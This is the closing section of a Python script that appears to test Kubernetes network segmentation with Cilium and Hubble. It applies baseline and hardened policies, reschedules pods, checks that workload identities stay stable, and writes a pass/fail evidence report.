    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--run-id", default=now().strftime("%Y%m%dT%H%M%SZ"))
    ap.add_argument("--out", default=str(ROOT / "evidence"))
    args = ap.parse_args()
    for tool in ("kubectl", "hubble", "cilium"):
        if not shutil.which(tool):
            print(f"missing {tool} on PATH", file=sys.stderr)
            return 2

    outdir = Path(args.out) / args.run_id
    outdir.mkdir(parents=True, exist_ok=True)
    ctx = kubectl("config", "current-context").stdout.strip()
    started = now()
    log(f"run {args.run_id} against {ctx}")

    with HubbleRelay():
        pc = preconditions()
        log(f"preconditions: cilium={pc['cilium_ready']} hubble={pc['hubble_ready']} "
            f"rbac_minimal={pc['foothold_rbac_minimal']} token={pc['foothold_token']}")
        if not (pc["cilium_ready"] and pc["hubble_ready"]):
            print("Cilium or Hubble not ready; refusing to measure anything.", file=sys.stderr)
            return 1

        apply_policy("baseline")
        base = run_profile("baseline", args.run_id, None, outdir)
        bstat = {k: {"status": v["status"]} for k, v in base["results"].items()}

        apply_policy("hardened")
        hard = run_profile("hardened", args.run_id, bstat, outdir)

        log("rescheduling frontend, api, db")
        before, after = reschedule()
        resch = run_profile("reschedule", args.run_id, bstat, outdir)

    ips_changed = all(b["ip"] != a["ip"] for b, a in zip(before, after))
    nodes_changed = all(b["node"] != a["node"] for b, a in zip(before, after))
    ids_stable = all(b["identity"] == a["identity"] and b["identity"] for b, a in zip(before, after))
    identical = all(hard["results"][s]["status"] == resch["results"][s]["status"] for s in hard["results"])
    profiles = [base, hard, resch]
    ok = (pc["foothold_rbac_minimal"] and pc["foothold_token"] == "absent"
          and all(r["pass"] for p in profiles for r in p["results"].values())
          and ips_changed and nodes_changed and ids_stable and identical)
    doc = {
        "run_id": args.run_id, "context": ctx, "started": iso(started), "finished": iso(now()),
        "pass": ok, "preconditions": pc, "profiles": profiles,
        "reschedule": {"before": before, "after": after, "ips_changed": ips_changed,
                       "nodes_changed": nodes_changed,
                       "identities_stable": ids_stable, "results_identical": identical},
    }
    write_report(outdir, doc)
    log(f"report: {outdir / 'report.md'}  overall={'PASS' if ok else 'FAIL'}")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
